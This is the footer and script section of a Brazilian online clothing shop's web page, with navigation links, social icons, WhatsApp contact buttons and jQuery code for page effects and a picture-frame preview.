  <a href="https://www.vickttoriavick.com.br/index.php?route=checkout/checkout" target="_self" style="background-color: rgb(255, 255, 255);">
  </a><br>
</p></div>      </div>       <a href="#" class="btn-close pull-right"><i class="fa fa-close"></i>Fechar e não mostrar novamente!!!</a>   </div> 
</div>
<script type="text/javascript"><!--
$(function() {
    $("#pavpopup_").pavoPopup().work();
});
--></script></div></div>
</div>
<footer>


  <div id="information" >
  <div class="container">
    <div class="row">
            <div class="col-sm-3">
        <h5>Informações</h5>
                <ul class="list-unstyled">
                    <li><a href="https://www.vickttoriavick.com.br/compras-no-atacado">Compras No Atacado</a></li>
                    <li><a href="https://www.vickttoriavick.com.br/programa-de-afiliados">Programa De Afiliados</a></li>
                    <li><a href="https://www.vickttoriavick.com.br/nossa-historia">Nossa História</a></li>
                    <li><a href="https://www.vickttoriavick.com.br/politica-de-entrega">Política De Entrega</a></li>
                    <li><a href="https://www.vickttoriavick.com.br/seguranca-e-privacidade">Segurança e Privacidade</a></li>
                    <li><a href="https://www.vickttoriavick.com.br/termos-and-condicoes">Termos &amp; Condições</a></li>
                    <li><a href="https://www.vickttoriavick.com.br/troca-e-devolucoes">Troca e Devoluções</a></li>
                    <li><a href="https://www.vickttoriavick.com.br/site-map">Mapa do site</a></li>        </ul>
              </div>
                  <div class="col-sm-3">
        <h5>Serviços ao cliente</h5>
        <ul class="list-unstyled">
          <li><a href="https://www.vickttoriavick.com.br/contato">Entre em contato</a></li>          <li><a href="https://www.vickttoriavick.com.br/minha-conta">Minha conta</a></li>          <li><a href="https://www.vickttoriavick.com.br/index.php?route=account/return/add">Solicitar devolução</a></li>          <li><a href="https://www.vickttoriavick.com.br/historico">Histórico de pedidos</a></li>          <li><a href="https://www.vickttoriavick.com.br/lista-desejos">Lista de desejos</a></li>        </ul>
      </div>
                  <div class="col-sm-3">
        <h5>Outros serviços</h5>
        <ul class="list-unstyled">
          <li><a href="https://www.vickttoriavick.com.br/marcas">Produtos por marca</a></li>          <li><a href="https://www.vickttoriavick.com.br/voucher">Comprar vale presentes</a></li>          <li><a href="https://www.vickttoriavick.com.br/afiliados-login">Programa de afiliados</a></li>          <li><a href="https://www.vickttoriavick.com.br/promocao">Produtos em promoção</a></li>          <li><a href="https://www.vickttoriavick.com.br/newsletter">Informativo</a></li>        </ul>
        
                <li id="footer-payment" class="dropup open">
        <!--<a href="#" title="Siga-nos" class="dropdown-toggle" data-toggle="dropdown">
        <i data-toggle="tooltip" data-placement="left" title="Pagamento" class="fa fa-credit-card"></i>
        </a>-->
        <ul class="dropdown-menu dropdown-menu-right payment-dropdown-menu" style="top: 0px; list-style-type: none">
            
                  
					                        <li data-toggle="tooltip" title="Payment" class="col-xs-4 col-sm-4">       
			<img src="https://www.vickttoriavick.com.br/image/catalog/Formas_Pagamentos_transp.png" alt="Payment" title="Payment">
        </li>
        				        
          
        
           
        
         
       
               
                           
        
           
        
         
                   
           
        
           
        
                
         
        
           
        
         
        
                
                    
          </ul>
        </li>
                

      </div>
                        <div id="social-payment" class="col-sm-3">
        <ul class="list-inline">                  

                <li id="footer-social" class="dropup open">
        <!--<a href="#" title="Siga-nos" class="dropdown-toggle" data-toggle="dropdown">
        <i data-toggle="tooltip" data-placement="left" title="Siga-nos" class="fa fa-share-alt"></i>
        </a>-->
          <ul class="dropdown-menu dropdown-menu-right social-dropdown-menu">
                        <li data-toggle="tooltip" title="Facebook" class="col-xs-4 col-sm-2 facebook"><a href="http://www.facebook.com/lojavickttoriavickplussize" title="Facebook" target="_blank"><i class="fa fa-facebook"></i></a></li>
            	                    <li data-toggle="tooltip" title="Twitter" class="col-xs-4 col-sm-2 twitter"><a href="https://twitter.com/vickttoriavick" title="Twitter" target="_blank"><i class="fa fa-twitter"></i></a></li>
            	        	        	                    <li data-toggle="tooltip" title="Pinterest" class="col-xs-4 col-sm-2 pinterest"><a href="https://br.pinterest.com/vickttoriavick/" title="Pinterest" target="_blank"><i class="fa fa-pinterest"></i></a></li>
            	         
	          
	        	                   <li data-toggle="tooltip" title="YouTube" class="col-xs-4 col-sm-2 youtube"><a href="https://www.youtube.com/channel/UCO2JaRi1QckfHYa4qt2VCBA" title="YouTube" target="_blank"><i class="fa fa-youtube-play"></i></a></li>
            	                                <li data-toggle="tooltip" title="Instagram" class="col-xs-4 col-sm-2 instagram"><a href="https://www.instagram.com/vickttoriavick/" title="Instagram" target="_blank"><i class="fa fa-instagram"></i></a></li>
               
               
                
                                       
          </ul>
        </li>
                
        </ul>
      </div>
          </div>
  </div>
  </div>
    
    
  
</footer>

<script src="catalog/view/theme/uptheme/js/jquery.visible.min.js" type="text/javascript"></script>
<script type="text/javascript">

var win = $(window);

var allMods = $("footer");

allMods.each(function(i, el) {
    
  if ($(el).visible(true)) {
    $(el).addClass("already-visible"); 
  }
  
});

win.scroll(function(event) {
  
  allMods.each(function(i, el) {
    
    var el = $(el);
    
    if (el.visible(true)) {
      el.addClass("come-in"); 
    } else {
      el.removeClass("come-in already-visible");
    }
    
  });
  
}); 
</script> 
<script src="catalog/view/theme/uptheme/js/tickerme.js" type="text/javascript"></script>
<script type="text/javascript">
$(function(){
	$('#ticker').tickerme();
});
</script>
<script type="text/javascript" src="catalog/view/theme/uptheme/js/jquery.easing-1.3.min.js"></script>
<script type="text/javascript" src="catalog/view/theme/uptheme/js/jquery.sticky.js"></script>
<script>
  $(window).load(function(){
    if ($(window).width() > 940) $("#menu:not(.ignore)").sticky({ topSpacing: 0 });
  });
</script>
<link rel="stylesheet" property="stylesheet" type="text/css" href="catalog/view/theme/uptheme/stylesheet/livesearch.css" />
<script type="text/javascript" src="catalog/view/theme/uptheme/js/livesearch.min.js?"></script>
<script type="text/javascript" src="catalog/view/theme/uptheme/js/quickview/quickview.js"></script>		
<link rel="stylesheet" property="stylesheet" href="catalog/view/theme/uptheme/js/quickview/fancybox/jquery.fancybox.css" />
<script src="catalog/view/theme/uptheme/js/quickview/fancybox/jquery.fancybox.pack.js"></script>
<script src="catalog/view/theme/uptheme/js/jquery.stellar.js" type="text/javascript"></script>

 
<script src="catalog/view/javascript/jquery/magnific/jquery.magnific-popup.min.js" type="text/javascript" defer></script>
 
<script src="catalog/view/javascript/jquery/pavpopup-lazy.js" type="text/javascript" defer></script>

<script type="text/javascript">
$(function () {

$('#open-top-custom-block').click();

if($('.panel.panel-default.filters').parents('.col-sm-3').length == 1)
{
$('.panel.panel-default.filters').parents('.col-sm-3').removeClass('col-sm-3').addClass('col-sm-2');
$('#content').removeClass('col-sm-9').addClass('col-sm-10');
}

/* Aleatorio */
/*
$('.product-layout').each(function(index, value){
topvalue = Math.floor(Math.random() * 30); 
$(this).css('margin-top',topvalue); 
$(this).css('margin-bottom',(30 - topvalue))
});
$('.product-layout').each(function(index, value){ 
marginvalue = (Math.random() > 0.7 && index > 4 ? 1 : 0);  
$(this).css('margin-left', $(this).width() * marginvalue / 2.0 )
});*/
/** fim ***/


    $('.form-group .control-label').each(function () {
        if ($(this).html().toLowerCase().indexOf('moldura') != -1) {
            moldura = $(this).parent('.form-group').find('select');
            moldura.on('change', mostrar_moldura);            
        }
        if ($(this).html().toLowerCase().indexOf('dimens') != -1) {
            dimensoes = $(this).parent('.form-group').find('select');
            dimensoes.on('change', mostrar_moldura);            
        }
    });
    
    
    function mostrar_moldura(){        
        $('.cloud-zoom.thumbnail img').removeClass('ajg-img');                
        $('.cloud-zoom.thumbnail img').css('background-image','');                
        
        if (typeof moldura == 'undefined') return;

        moldura_valor = moldura.find('option:selected').text();
        dimensoes_valor = dimensoes.find('option:selected').text();

        console.log(moldura_valor);
        
        if (typeof moldura_valor != 'undefined' && moldura_valor.length > 0 && typeof moldura_valor != 'dimensoes_valor') {
            dimensoes_valor = dimensoes_valor.split(' ');

            console.log(dimensoes_valor);            
            
            if (dimensoes_valor.length > 0) {
                dimensoes_valor = dimensoes_valor[0];                
                if (dimensoes_valor.length > 0) {
                    dimensoes_valor = '-' + dimensoes_valor;
                }else{
                    dimensoes_valor = ''
                }
            }
            else{
                dimensoes_valor = ''
            }
            
            background = 'url(image/molduras/' + (moldura_valor + dimensoes_valor + '.png').toLowerCase() + ')';

            
            console.log(background);        
            
            $('.cloud-zoom.thumbnail img').addClass('ajg-img');                
            $('.cloud-zoom.thumbnail img').css('background-image',background);                                
        }            
    }        
});
</script>

</div>


<script>
</script>


<a href="https://web.whatsapp.com/send?phone=556132246110&text=" class="whats_box hide-on-phone" target="_blank">
<img alt="Whatsapp" src="image/catalog/whatsapp96.png"  class="whats_img"/> </a>
<a href="https://api.whatsapp.com/send?phone=556132246110&text=" class="whats_box hide-on-dk" target="_blank">
<img alt="Whatsapp" src="image/catalog/whatsapp64.png"  class="whats_img"/> </a>

<style>
.whats_box{
    position: fixed;
    bottom: 5px;
    right: 20px;
    z-index: 10000;
}
.whats_img{
    border: none;
    padding: 10px 10px 10px 10px;
}

@media (min-width: 768px) {.hide-on-dk{display:none;}}
@media only screen and (max-width: 760px) {.hide-on-phone {display: none !important; }}
@media only screen and (min-width: 760px) and (max-width: 1024px) {.hide-on-tablet {display: none !important; }}

</style>
            
</body></html>
